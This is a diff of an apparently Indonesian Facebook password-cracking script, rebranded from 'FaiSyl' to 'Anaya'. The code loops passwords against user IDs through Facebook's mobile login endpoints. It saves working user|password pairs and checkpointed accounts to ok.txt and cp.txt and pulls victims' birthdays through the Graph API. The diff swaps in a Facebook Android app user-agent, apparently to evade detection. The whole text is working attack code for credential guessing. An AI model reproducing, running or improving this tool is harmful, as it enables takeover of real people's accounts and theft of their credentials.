@@ -228,7 +228,7 @@ class __xxx__:
     def __metode__(self, user, __chi__, cebok):
         global ok, cp, loop
         sys.stdout.write(
-            f"\r\x1b[1;97m[FaiSyl] {loop}~{len(self.id)} \x1b[1;92mOK={len(ok)}\x1b[1;97m/\x1b[1;91mCP={len(cp)} ")
+            f"\r\x1b[1;97m[Anaya] {loop}~{len(self.id)} \x1b[1;92mOK={len(ok)}\x1b[1;97m/\x1b[1;91mCP={len(cp)} ")
         sys.stdout.flush()
         try:
             for pw in __chi__:
@@ -237,7 +237,7 @@ class __xxx__:
                 header = {
                     "Host": cebok,
                     "upgrade-insecure-requests": "1",
-                    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.106 Safari/537.36",
+                    "user-agent": "[FBAN/FB4A;FBAV/444.0.0.31.114;FBBV/924159209;FBDM/{density=1.5,width=480,height=800};FBLC/fr_FR;FBRV/576861186;FBCR/null;FBMF/HTC;FBBD/HTC;FBPN/com.facebook.katana;FBDV/6545LVW;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
                     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                     "dnt": "1",
                     "x-requested-with": "mark.via.gp",
@@ -265,7 +265,7 @@ class __xxx__:
                     "upgrade-insecure-requests": "1",
                     "origin": "https://"+cebok,
                     "content-type": "application/x-www-form-urlencoded",
-                    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.106 Safari/537.36 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]",
+                    "user-agent": "[FBAN/FB4A;FBAV/444.0.0.31.114;FBBV/924159209;FBDM/{density=1.5,width=480,height=800};FBLC/fr_FR;FBRV/576861186;FBCR/null;FBMF/HTC;FBBD/HTC;FBPN/com.facebook.katana;FBDV/6545LVW;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
                     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                     "x-requested-with": "XMLHttpRequest",
                     "sec-fetch-site": "same-origin",
@@ -281,7 +281,7 @@ class __xxx__:
                 if 'c_user' in session.cookies.get_dict():
                     coki = ";".join(
                         [key+"="+value for key, value in session.cookies.get_dict().items()])
-                    print(f"\r{H}[FaiSy-OK] {user} | {pw}")
+                    print(f"\r{H}[Anaya-OK] {user} | {pw}")
                     wrt = '%s|%s' % (user, pw)
                     ok.append(wrt)
                     open('ok.txt', 'a').write('%s\n' % wrt)
@@ -294,7 +294,7 @@ class __xxx__:
                             f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s[FaiSy-CP] %s | %s ' % (M, user, pw))
+                        print('\r%s[Anaya-CP] %s | %s ' % (M, user, pw))
                         wrt = '%s|%s' % (user, pw)
                         cp.append(wrt)
                         open('cp.txt', 'a').write('%s\n' % wrt)
@@ -305,7 +305,7 @@ class __xxx__:
                         year = ''
                     except:
                         pass
-                    print('\r%s[FaiSy-CP] %s | %s ' % (M, user, pw))
+                    print('\r%s[Anaya-CP] %s | %s ' % (M, user, pw))
                     wrt = '%s|%s' % (user, pw)
                     cp.append(wrt)
                     open('cp.txt', 'a').write('%s\n' % wrt)
@@ -685,13 +685,13 @@ def clotox(cookie):
 
 
 url_businness = "https://business.facebook.com"
-ua_business = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.106 Safari/537.36"
+ua_business = "[FBAN/FB4A;FBAV/444.0.0.31.114;FBBV/924159209;FBDM/{density=1.5,width=480,height=800};FBLC/fr_FR;FBRV/576861186;FBCR/null;FBMF/HTC;FBBD/HTC;FBPN/com.facebook.katana;FBDV/6545LVW;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
 kata_dev = 'Lu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding'
 web_fb = "https://www.facebook.com/"
 m_fb = "https://m.facebook.com/"
 mbasic = "https://mbasic.facebook.com/"
 header_grup = {
-    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.106 Safari/537.36 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
+    "user-agent": "[FBAN/FB4A;FBAV/444.0.0.31.114;FBBV/924159209;FBDM/{density=1.5,width=480,height=800};FBLC/fr_FR;FBRV/576861186;FBCR/null;FBMF/HTC;FBBD/HTC;FBPN/com.facebook.katana;FBDV/6545LVW;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"}
 ###
 
 Z = "\x1b[0;90m"     # Hitam
